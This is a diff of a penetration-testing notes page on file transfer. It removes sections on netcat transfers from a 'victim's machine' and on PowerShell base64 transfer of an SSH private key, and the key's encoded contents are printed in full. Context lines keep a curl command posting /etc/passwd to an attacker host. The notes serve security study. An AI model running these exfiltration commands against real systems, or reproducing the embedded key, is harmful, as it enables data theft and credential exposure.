@@ -100,38 +100,6 @@ echo -e "GET /file.sh HTTP/1.1\n\n">&3
 cat <&3
 ```
 
-## Netcat
-
-### Printing information on screen
-
-On the server side (attacking machine):
-
-```bash
-#data will be printed on screen
-nc -lvp <port>  
-```
-
-On the client side (victim's machine):
-
-```bash
-echo “hello” | nc -v $ip <port>
-```
-
-###  Transfer data and save it in a file with netcat
-
-On the server side (attacking machine):
-
-```bash
-# Data will be stored in reveived.txt file.
-nc -lvp <port> > received.txt   
-```
-
-On the client side (victim's machine):
-
-```bash
-cat tobesentfiel.txt | nc -v $ip <port>
-```
-
 
 ## SSH downloads and uploads: SCP
 
@@ -212,28 +180,4 @@ curl -X POST https://$attackerIP/upload -F 'files=@/etc/passwd' -F 'files=@/etc/
  ## Backdoors
 
 See [reverse shells](reverse-shells.md), [bind shells](bind-shells.md), and [web shells](web-shells.md).
-
-
-## Windows File Transfer Methods
-
-### PowerShell Base64 Encode & Decode
-
-If we have access to a terminal, we can encode a file to a base64 string, copy its contents from the terminal and perform the reverse operation, decoding the file in the original content. Let's see how we can do this with PowerShell.
-
-```bash
-# We have access to the machine `MS02`, and we need to download a file from our `Pwnbox` machine. 
-
-# Pwnbox Check SSH Key MD5 Hash
-md5sum id_rsa
-
-# Pwnbox Encode SSH Key to Base64
-cat id_rsa |base64 -w 0;echo
-
-# Copy content and paste it into a Windows PowerShell terminal and decode it.
-PS C:\lala> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))
-
-# Confirming the MD5 Hashes Match with [Get-FileHash cmdlet](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash?view=powershell-7.2)
-PS C:\lala> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
-
-# While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. 
 
